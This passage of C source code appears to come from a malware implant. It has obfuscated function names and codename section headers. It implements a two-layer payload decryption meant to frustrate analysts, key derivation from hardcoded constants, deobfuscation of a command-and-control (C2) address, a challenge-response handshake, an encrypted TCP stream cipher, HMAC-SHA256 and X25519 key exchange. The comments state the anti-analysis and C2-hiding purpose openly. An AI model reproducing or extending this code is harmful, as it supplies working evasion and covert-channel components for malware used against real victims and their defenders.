        { size_t i; for (i = 0; i < chunk; i++) result.data[off+i] = ct[off+i] ^ ks[i]; }
        off += chunk;
    }

    explicit_bzero(key, 32);
    explicit_bzero(poly_key, 64);
    return result;
}

/* ======================================================================
   Dual-layer decrypt: AES-256-CTR (outer) then ChaCha20-Poly1305 AEAD (inner)
   Two different keys, two different ciphers. Analyst must break both.
   ====================================================================== */

dbuf _PP4rn3w(const uint8_t* blob, size_t len) {
    dbuf intermediate, result;
    db_init(&result);
    intermediate = _Uk7sK7L(blob, len);
    if (db_len(&intermediate) == 0) { db_free(&intermediate); return result; }
    result = _iW7Tx4Y(db_ptr(&intermediate), db_len(&intermediate));
    db_free(&intermediate);
    return result;
}

/* ======================================================================
   Charizard — key derivation
   ====================================================================== */

dbuf _tf7PF5b(const char* seed) {
    uint8_t key[32], entropy[8];
    _BW4EK8x ctx; dbuf hash;
    int i; size_t slen = strlen(seed);
    _fxd(_rx0, _rx1, key);
    entropy[0]=0xDE; entropy[1]=0xAD; entropy[2]=0xBE; entropy[3]=0xEF;
    entropy[4]=0xCA; entropy[5]=0xFE; entropy[6]=0xBA; entropy[7]=0xBE;
    for (i = 0; i < 8; i++) entropy[i] ^= (uint8_t)(slen + i * 17);
    _tP5sQ3C(&ctx);
    _iS7pL8N(&ctx, (const uint8_t*)seed, slen);
    _iS7pL8N(&ctx, key, 32);
    _iS7pL8N(&ctx, entropy, 8);
    db_init(&hash); db_reserve(&hash, 32); hash.len = 32;
    _Vd5Ph6z(&ctx, hash.data);
    memset(key, 0, 32);
    return hash;
}

/* ======================================================================
   Venusaur — C2 address deobfuscation
   ====================================================================== */

dstr _Kd6BF5m(const char* encoded) {
    dstr result; dbuf layer1, key, layer2_buf, layer3;
    uint8_t expected_hmac[32];
    size_t i, pl;
    ds_init(&result);
    layer1 = _rr5LH7D(encoded);
    if (db_len(&layer1) == 0) { db_free(&layer1); return result; }
    iB2Zq4a();
    key = _tf7PF5b(ds_cstr(&_gC8se3d));
    db_init(&layer2_buf); db_reserve(&layer2_buf, layer1.len); layer2_buf.len = layer1.len;
    for (i = 0; i < layer1.len; i++) layer2_buf.data[i] = layer1.data[i] ^ key.data[i % key.len];
    layer3 = _xf5uT6g(layer2_buf.data, layer2_buf.len, key.data, key.len);
    db_free(&layer1); db_free(&layer2_buf);
    if (db_len(&layer3) == 0) { db_free(&key); db_free(&layer3); return result; }
    /* Verify 8-byte HMAC-SHA256 checksum (keyed, using _tf7PF5b key) */
    if (layer3.len < 9) { db_free(&key); db_free(&layer3); return result; }
    pl = layer3.len - 8;
    _no3nm7v(key.data, key.len, layer3.data, pl, expected_hmac);
    {
        int mismatch = 0;
        for (i = 0; i < 8; i++) mismatch |= layer3.data[pl+i] ^ expected_hmac[i];
        if (mismatch) { db_free(&key); db_free(&layer3); return result; }
    }
    ds_setn(&result, (const char*)layer3.data, pl);
    db_free(&key); db_free(&layer3);
    return result;
}

/* ======================================================================
   Hafnium — auth: Base64(SHA256(challenge + secret + challenge))
   ====================================================================== */

dstr _Xe8Yw5c(const char* challenge, const char* secret) {
    _BW4EK8x ctx; uint8_t hash[32]; dstr out;
    _tP5sQ3C(&ctx);
    _iS7pL8N(&ctx, (const uint8_t*)challenge, strlen(challenge));
    _iS7pL8N(&ctx, (const uint8_t*)secret, strlen(secret));
    _iS7pL8N(&ctx, (const uint8_t*)challenge, strlen(challenge));
    _Vd5Ph6z(&ctx, hash);
    out = _uA7kc2G(hash, 32);
    return out;
}

/* ======================================================================
   Stream cipher for encrypted TCP
   ====================================================================== */

void _BV3cU8N(_yJ6fE3k* cs, const uint8_t key[32]) {
    memcpy(cs->key, key, 32);
    memset(cs->nonce, 0, 12);
    cs->counter = 0;
    cs->ks_pos = 64;
}

int _gF6Fb8W(_yJ6fE3k* cs, uint8_t* data, size_t len) {
    size_t i; int j;
    for (i = 0; i < len; i++) {
        if (cs->ks_pos >= 64) {
            if (cs->counter > 0xFFFF0000) return -1; /* counter overflow */
            uint32_t state[16];
            state[0]=0x61707865; state[1]=0x3320646e;
            state[2]=0x79622d32; state[3]=0x6b206574;
            for (j = 0; j < 8; j++)
                state[4+j]=((uint32_t)cs->key[j*4])|((uint32_t)cs->key[j*4+1]<<8)|
                           ((uint32_t)cs->key[j*4+2]<<16)|((uint32_t)cs->key[j*4+3]<<24);
            state[12] = cs->counter;
            state[13] = cs->nonce[0]; state[14] = cs->nonce[1]; state[15] = cs->nonce[2];
            _Yh4kQ4V(state, cs->ks);
            cs->counter++;
            cs->ks_pos = 0;
        }
        data[i] ^= cs->ks[cs->ks_pos++];
    }
    return 0;
}

/* ======================================================================
   HMAC-SHA256
   ====================================================================== */

void _no3nm7v(const uint8_t *key, size_t key_len,
                 const uint8_t *msg, size_t msg_len,
                 uint8_t out[32])
{
    _BW4EK8x ctx;
    uint8_t k_pad[64];
    uint8_t inner_hash[32];
    size_t i;

    /* If key > 64 bytes, hash it first */
    uint8_t key_block[64];
    memset(key_block, 0, 64);
    if (key_len > 64) {
        _tP5sQ3C(&ctx);
        _iS7pL8N(&ctx, key, key_len);
        _Vd5Ph6z(&ctx, key_block);
    } else {
        memcpy(key_block, key, key_len);
    }

    /* Inner hash: SHA256((key ^ ipad) || message) */
    for (i = 0; i < 64; i++) k_pad[i] = key_block[i] ^ 0x36;
    _tP5sQ3C(&ctx);
    _iS7pL8N(&ctx, k_pad, 64);
    _iS7pL8N(&ctx, msg, msg_len);
    _Vd5Ph6z(&ctx, inner_hash);

    /* Outer hash: SHA256((key ^ opad) || inner_hash) */
    for (i = 0; i < 64; i++) k_pad[i] = key_block[i] ^ 0x5c;
    _tP5sQ3C(&ctx);
    _iS7pL8N(&ctx, k_pad, 64);
    _iS7pL8N(&ctx, inner_hash, 32);
    _Vd5Ph6z(&ctx, out);

    memset(key_block, 0, 64);
    memset(k_pad, 0, 64);
    memset(inner_hash, 0, 32);
}

/* ======================================================================
   X25519 — Curve25519 Diffie-Hellman (constant-time)
   Based on TweetNaCl's crypto_scalarmult_curve25519
   ====================================================================== */

typedef int64_t gf[16];
static const gf _Pb5Dx3G = {0xDB41, 1};

static void _mr4oj8w(gf o) {
    int i; int64_t c;
    for (i = 0; i < 16; i++) {
        o[i] += (1LL << 16);
        c = o[i] >> 16;
        o[(i+1) * (i < 15)] += c - 1 + 37 * (c - 1) * (i == 15);
        o[i] -= c << 16;
    }
}

static void _yy3ny2a(gf p, gf q, int b) {
    int64_t t, i, c = ~(b - 1);
    for (i = 0; i < 16; i++) {
        t = c & (p[i] ^ q[i]);
        p[i] ^= t;
        q[i] ^= t;
    }
}

static void _Em5Xp6z(uint8_t o[32], const gf n) {
    int i, j; gf m, t;
    memcpy(t, n, sizeof(gf));
    _mr4oj8w(t); _mr4oj8w(t); _mr4oj8w(t);
    for (j = 0; j < 2; j++) {
        m[0] = t[0] - 0xFFED;
        for (i = 1; i < 15; i++) {
            m[i] = t[i] - 0xFFFF - ((m[i-1] >> 16) & 1);
            m[i-1] &= 0xFFFF;
        }
        m[15] = t[15] - 0x7FFF - ((m[14] >> 16) & 1);
        int b = (m[15] >> 63) & 1;
        m[14] &= 0xFFFF;
        _yy3ny2a(t, m, 1 - b);
    }
    for (i = 0; i < 16; i++) {
        o[2*i] = (uint8_t)(t[i] & 0xFF);
        o[2*i+1] = (uint8_t)(t[i] >> 8);
    }
}

static void _Tn3tF8B(gf o, const uint8_t n[32]) {
    int i;
    for (i = 0; i < 16; i++)
        o[i] = (int64_t)n[2*i] + ((int64_t)n[2*i+1] << 8);
    o[15] &= 0x7FFF;
}

static void _TV2qA7J(gf o, const gf a, const gf b) {
    int i; for (i = 0; i < 16; i++) o[i] = a[i] + b[i];
}

static void _sQ4jm5q(gf o, const gf a, const gf b) {
    int i; for (i = 0; i < 16; i++) o[i] = a[i] - b[i];
}

static void _uk5ES5X(gf o, const gf a, const gf b) {
    int i, j; int64_t t[31];
    memset(t, 0, sizeof(t));
    for (i = 0; i < 16; i++)
        for (j = 0; j < 16; j++)
            t[i+j] += a[i] * b[j];
    for (i = 16; i < 31; i++)
        t[i-16] += 38 * t[i];
    memcpy(o, t, 16 * sizeof(int64_t));
    _mr4oj8w(o); _mr4oj8w(o);
}

static void _vT7TV3a(gf o, const gf a) { _uk5ES5X(o, a, a); }

static void _ed7VZ8r(gf o, const gf i) {
    gf c; int a;
    memcpy(c, i, sizeof(gf));
    for (a = 253; a >= 0; a--) {
        _vT7TV3a(c, c);
        if (a != 2 && a != 4) _uk5ES5X(c, c, i);
    }
    memcpy(o, c, sizeof(gf));
}

void _aw4Ma4u(uint8_t q[32], const uint8_t n[32], const uint8_t p[32]) {
    uint8_t z[32];
    int64_t r; int i;
    gf a, b, c, d, e, f, x;

    memcpy(z, n, 32);
    z[31] = (z[31] & 127) | 64;
    z[0] &= 248;

    _Tn3tF8B(x, p);
    memset(a, 0, sizeof(gf)); a[0] = 1;
    memset(b, 0, sizeof(gf)); memcpy(b, x, sizeof(gf));
    memset(c, 0, sizeof(gf));
    memset(d, 0, sizeof(gf)); d[0] = 1;

    for (i = 254; i >= 0; i--) {
        r = (z[i >> 3] >> (i & 7)) & 1;
        _yy3ny2a(a, b, (int)r);
        _yy3ny2a(c, d, (int)r);
        _TV2qA7J(e, a, c);
        _sQ4jm5q(a, a, c);
        _TV2qA7J(c, b, d);
        _sQ4jm5q(b, b, d);
        _vT7TV3a(d, e);
        _vT7TV3a(f, a);
        _uk5ES5X(a, c, a);
        _uk5ES5X(c, b, e);
        _TV2qA7J(e, a, c);
        _sQ4jm5q(a, a, c);
        _vT7TV3a(b, a);
        _sQ4jm5q(c, d, f);
        _uk5ES5X(a, c, _Pb5Dx3G);
        _TV2qA7J(a, a, d);
        _uk5ES5X(c, c, a);
        _uk5ES5X(a, d, f);
        _uk5ES5X(d, b, x);
        _vT7TV3a(b, e);
        _yy3ny2a(a, b, (int)r);
        _yy3ny2a(c, d, (int)r);
    }
    _ed7VZ8r(c, c);
    _uk5ES5X(a, a, c);
    _Em5Xp6z(q, a);
}

/* Base point for Curve25519: 9 */
static const uint8_t _rX5YN5y[32] = {9};

void _go6pR4p(uint8_t q[32], const uint8_t n[32]) {
    _aw4Ma4u(q, n, _rX5YN5y);
}
